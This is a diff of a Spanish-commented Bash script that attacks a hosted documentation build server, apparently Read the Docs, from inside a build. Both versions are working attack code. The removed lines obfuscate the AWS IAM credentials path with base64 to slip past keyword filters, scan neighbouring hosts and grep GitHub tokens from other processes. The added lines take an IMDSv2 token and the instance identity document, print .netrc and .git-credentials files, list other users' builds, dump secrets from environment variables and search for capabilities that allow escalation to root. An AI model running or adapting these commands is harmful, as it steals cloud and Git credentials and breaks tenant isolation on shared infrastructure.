@@ -1,52 +1,39 @@
 #!/bin/bash
 
-# Colores para legibilidad
+# Colores para el reporte
 G='\033[0;32m'
 R='\033[0;31m'
 NC='\033[0m'
 
-echo -e "${G}--- 1. DETECCIÓN DE PROXY (ANÁLISIS DE HEADERS) ---${NC}"
+echo -e "${G}=== 1. IDENTIDAD Y PRIVILEGIOS ===${NC}"
+id
+hostname
+uname -a
+
+echo -e "\n${G}=== 2. AWS CLOUD IDENTITY (SSRF PROOF) ===${NC}"
+# Intentamos obtener el Identity Document (ID de cuenta de Amazon)
 TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+if [ -n "$TOKEN" ]; then
+    echo "[+] Token IMDSv2 obtenido."
+    curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
+else
+    echo "[-] No se pudo acceder a los metadatos de AWS."
+fi
 
-# Función para analizar quién responde
-analizar_cabeceras() {
-    local url=$1
-    echo -e "\n[+] Analizando: $url"
-    # Capturamos cabeceras y buscamos firmas conocidas
-    local headers=$(curl -s -I -H "X-aws-ec2-metadata-token: $TOKEN" "$url")
-    echo "$headers" | grep -iE "Server|Via|X-Cache|X-Forwarded|Proxy-Connection"
-    
-    if echo "$headers" | grep -iq "Server: EC2ws"; then
-        echo -e "${G}[!] CONFIRMADO: Responde Amazon EC2 directamente.${NC}"
-    elif echo "$headers" | grep -iqE "nginx|squid|apache|varnish|cloudflare"; then
-        echo -e "${R}[!] ALERTA: Proxy/WAF detectado interponiéndose.${NC}"
-    fi
-}
+echo -e "\n${G}=== 3. EXFILTRACIÓN DE CREDENCIALES DE GIT ===${NC}"
+# Buscamos tokens reales en archivos ocultos
+if [ -f ~/.netrc ]; then echo "[!] ARCHIVO .netrc ENCONTRADO:"; cat ~/.netrc; fi
+if [ -f ~/.git-credentials ]; then echo "[!] ARCHIVO .git-credentials ENCONTRADO:"; cat ~/.git-credentials; fi
 
-analizar_cabeceras "http://169.254.169.254/latest/meta-data/"
-analizar_cabeceras "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+echo -e "\n${G}=== 4. AISLAMIENTO DE CLIENTES (MULTI-TENANCY) ===${NC}"
+# Intentamos ver si hay otros proyectos en el mismo nodo
+echo "[+] Listando otros builds en el servidor:"
+ls -la /home/docs/checkouts/readthedocs.org/user_builds/
 
-echo -e "\n${G}--- 2. BYPASS DE PALABRAS CLAVE (Ofuscación Base64) ---${NC}"
-# Intentamos acceder a IAM construyendo la cadena en memoria
-IAM_B64="aWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzLw==" # iam/security-credentials/
-PATH_DECODED=$(echo "$IAM_B64" | base64 -d)
+echo -e "\n${G}=== 5. SECRETOS DEL SISTEMA (PROC ENVIRON) ===${NC}"
+# Limpiamos las variables de entorno para verlas bien
+cat /proc/self/environ | tr '\0' '\n' | grep -iE "TOKEN|SECRET|PASS|KEY|AUTH|DSN"
 
-echo "[+] Intentando acceso ofuscado a: $PATH_DECODED"
-curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/$PATH_DECODED"
-
-echo -e "\n${G}--- 3. ESCANEO DE RED (Identificando vecinos) ---${NC}"
-# Escaneamos el segmento actual para ver si hay otros contenedores/servicios
-MY_IP=$(hostname -I | awk '{print $1}')
-echo "Mi IP: $MY_IP"
-SUBNET=$(echo $MY_IP | cut -d'.' -f1-3)
-
-for i in {1..15}; do
-    (timeout 0.2 bash -c "echo > /dev/tcp/$SUBNET.$i/80" 2>/dev/null && echo -e "${G}IP $SUBNET.$i:80 ABIERTO${NC}") &
-    (timeout 0.2 bash -c "echo > /dev/tcp/$SUBNET.$i/7007" 2>/dev/null && echo -e "${G}IP $SUBNET.$i:7007 ABIERTO${NC}") &
-done
-wait
-
-echo -e "\n${G}--- 4. EXFILTRACIÓN DE DATOS DE PROCESO ---${NC}"
-# Buscamos tokens de Git o secretos en las variables de entorno de otros procesos
-# Si podemos leer /proc, podemos ver el entorno de otros contenedores si no hay aislamiento
-grep -oaE "ghp_[a-zA-Z0-9]{36}" /proc/*/environ 2>/dev/null | head -n 5 || echo "No se encontraron tokens de GitHub en procesos."
+echo -e "\n${G}=== 6. CAPABILITIES (LOCAL ESCALATION) ===${NC}"
+# Ver si algún binario nos permite subir a root
+/sbin/getcap -r / 2>/dev/null | head -n 10
